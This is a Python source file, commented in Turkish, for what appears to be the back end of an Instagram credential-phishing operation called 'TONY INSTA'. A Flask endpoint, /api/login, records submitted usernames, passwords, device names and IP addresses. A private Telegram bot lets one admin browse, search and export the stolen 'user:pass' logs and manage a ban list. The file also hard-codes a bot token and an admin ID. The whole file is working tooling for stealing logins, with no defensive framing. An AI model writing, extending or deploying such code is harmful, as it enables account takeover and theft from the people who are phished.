import os
import json
import asyncio
import threading
from datetime import datetime
from flask import Flask, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ============ AYARLAR ============
TOKEN = "8431868574:AAEc-_F30ArVC13DX6pD8XZ7rqqwTwE9uWQ"
ADMIN_ID = 6301142073
PORT = int(os.environ.get("PORT", 10000))

# ============ VERİTABANI ============
DB_FILE = "database.json"
BAN_FILE = "banned.json"

def load_db():
    if not os.path.exists(DB_FILE):
        with open(DB_FILE, "w") as f:
            json.dump([], f)
    with open(DB_FILE, "r") as f:
        return json.load(f)

def save_db(data):
    with open(DB_FILE, "w") as f:
        json.dump(data, f, indent=2)

def load_banned():
    if not os.path.exists(BAN_FILE):
        with open(BAN_FILE, "w") as f:
            json.dump([], f)
    with open(BAN_FILE, "r") as f:
        return json.load(f)

def save_banned(data):
    with open(BAN_FILE, "w") as f:
        json.dump(data, f, indent=2)

# ============ FLASK API ============
app = Flask(__name__)

@app.route("/")
def home():
    return "TONY INSTA API ONLINE"

@app.route("/api/login", methods=["GET"])
def api_login():
    user = request.args.get("user", "Bilinmiyor")
    passw = request.args.get("pass", "Bilinmiyor")
    device = request.args.get("device", "Bilinmiyor")
    ip = request.remote_addr

    data = load_db()
    entry = {
        "user": user,
        "pass": passw,
        "device": device,
        "ip": ip,
        "time": datetime.now().strftime("%d.%m.%Y %H:%M:%S")
    }
    data.append(entry)
    save_db(data)

    return jsonify({"status": "ok"})

@app.route("/api/check_ban", methods=["GET"])
def api_check_ban():
    user = request.args.get("user", "")
    banned = load_banned()
    if user in banned:
        return jsonify({"banned": True})
    return jsonify({"banned": False})

# ============ TELEGRAM BOT ============
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Bu bot özeldir. Erişim reddedildi.")
        return

    data = load_db()
    banned = load_banned()
    today = datetime.now().strftime("%d.%m.%Y")
    today_count = sum(1 for d in data if d["time"].startswith(today))

    keyboard = [
        [InlineKeyboardButton("📊 Tüm Kullanıcılar", callback_data="list")],
        [InlineKeyboardButton("🔍 Kullanıcı Ara", callback_data="search")],
        [InlineKeyboardButton("⛔ Ban Yönetimi", callback_data="ban_mgmt")],
        [InlineKeyboardButton("📤 Veritabanı Dışa Aktar", callback_data="export")],
        [InlineKeyboardButton("🗑 Veritabanı Temizle", callback_data="clear")],
    ]

    text = f"👹 TONY INSTA PANEL\n\n🟢 Toplam: {len(data)}\n🆕 Bugün: {today_count}\n⛔ Banlı: {len(banned)}"
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.from_user.id != ADMIN_ID:
        return

    cmd = query.data

    if cmd == "list":
        data = load_db()
        if not data:
            await query.edit_message_text("📂 Henüz kullanıcı yok.")
            return
        text = "📂 SON 20 KULLANICI:\n\n"
        for i, u in enumerate(data[-20:], 1):
            text += f"{i}. 👤 {u['user']} | 🔑 {u['pass']} | {u['time']}\n"
        await query.edit_message_text(text)

    elif cmd == "search":
        context.user_data["waiting"] = "search"
        await query.edit_message_text("🔍 Aramak istediğin kullanıcı adını yaz:")

    elif cmd == "ban_mgmt":
        banned = load_banned()
        keyboard = [
            [InlineKeyboardButton("➕ Yeni Ban Ekle", callback_data="add_ban")],
            [InlineKeyboardButton("✅ Ban Kaldır", callback_data="remove_ban")],
            [InlineKeyboardButton("📋 Banlı Listesi", callback_data="ban_list")],
            [InlineKeyboardButton("🔙 Ana Menü", callback_data="menu")],
        ]
        text = f"⛔ BAN YÖNETİMİ\n\nBanlı: {len(banned)}"
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

    elif cmd == "add_ban":
        context.user_data["waiting"] = "add_ban"
        await query.edit_message_text("⛔ Banlamak istediğin kullanıcı adını yaz:")

    elif cmd == "remove_ban":
        context.user_data["waiting"] = "remove_ban"
        await query.edit_message_text("✅ Banını kaldırmak istediğin kullanıcı adını yaz:")

    elif cmd == "ban_list":
        banned = load_banned()
        if not banned:
            await query.edit_message_text("📋 Banlı liste boş.")
        else:
            text = "⛔ BANLI KULLANICILAR:\n\n"
            for i, u in enumerate(banned, 1):
                text += f"{i}. {u}\n"
            await query.edit_message_text(text)

    elif cmd == "export":
        data = load_db()
        if not data:
            await query.edit_message_text("📤 Dışa aktarılacak veri yok.")
            return
        txt = "TONY INSTA LOGS\n\n"
        for u in data:
            txt += f"{u['user']}:{u['pass']} | {u['device']} | {u['time']}\n"
        with open("tony_logs.txt", "w", encoding="utf-8") as f:
            f.write(txt)
        await context.bot.send_document(chat_id=ADMIN_ID, document=open("tony_logs.txt", "rb"), filename="tony_logs.txt")
        await query.edit_message_text("📤 TXT dosyası gönderildi!")

    elif cmd == "clear":
        save_db([])
        await query.edit_message_text("🗑 Veritabanı temizlendi!")

    elif cmd == "menu":
        data = load_db()
        banned = load_banned()
        today = datetime.now().strftime("%d.%m.%Y")
        today_count = sum(1 for d in data if d["time"].startswith(today))
        keyboard = [
            [InlineKeyboardButton("📊 Tüm Kullanıcılar", callback_data="list")],
            [InlineKeyboardButton("🔍 Kullanıcı Ara", callback_data="search")],
            [InlineKeyboardButton("⛔ Ban Yönetimi", callback_data="ban_mgmt")],
            [InlineKeyboardButton("📤 Veritabanı Dışa Aktar", callback_data="export")],
            [InlineKeyboardButton("🗑 Veritabanı Temizle", callback_data="clear")],
        ]
        text = f"👹 TONY INSTA PANEL\n\n🟢 Toplam: {len(data)}\n🆕 Bugün: {today_count}\n⛔ Banlı: {len(banned)}"
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    text = update.message.text
    waiting = context.user_data.get("waiting")

    if waiting == "search":
        data = load_db()
        results = [u for u in data if text.lower() in u["user"].lower()]
        if not results:
            await update.message.reply_text("🔍 Sonuç bulunamadı.")
        else:
            msg = f"🔍 '{text}' SONUÇLARI:\n\n"
            for i, u in enumerate(results[:10], 1):
                msg += f"{i}. 👤 {u['user']} | 🔑 {u['pass']} | 📱 {u['device']}\n"
            msg += f"\nToplam: {len(results)}"
            await update.message.reply_text(msg)
        context.user_data["waiting"] = None

    elif waiting == "add_ban":
        banned = load_banned()
        if text not in banned:
            banned.append(text)
            save_banned(banned)
            await update.message.reply_text(f"⛔ {text} banlandı!")
        else:
            await update.message.reply_text(f"⚠️ {text} zaten banlı.")
        context.user_data["waiting"] = None

    elif waiting == "remove_ban":
        banned = load_banned()
        if text in banned:
            banned.remove(text)
            save_banned(banned)
            await update.message.reply_text(f"✅ {text} banı kaldırıldı.")
        else:
            await update.message.reply_text(f"⚠️ {text} banlı listede yok.")
        context.user_data["waiting"] = None

    else:
        await start(update, context)

# ============ BAŞLATMA ============
def run_flask():
    app.run(host="0.0.0.0", port=PORT)

def run_bot():
    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("panel", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    application.run_polling()

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    run_bot()
  
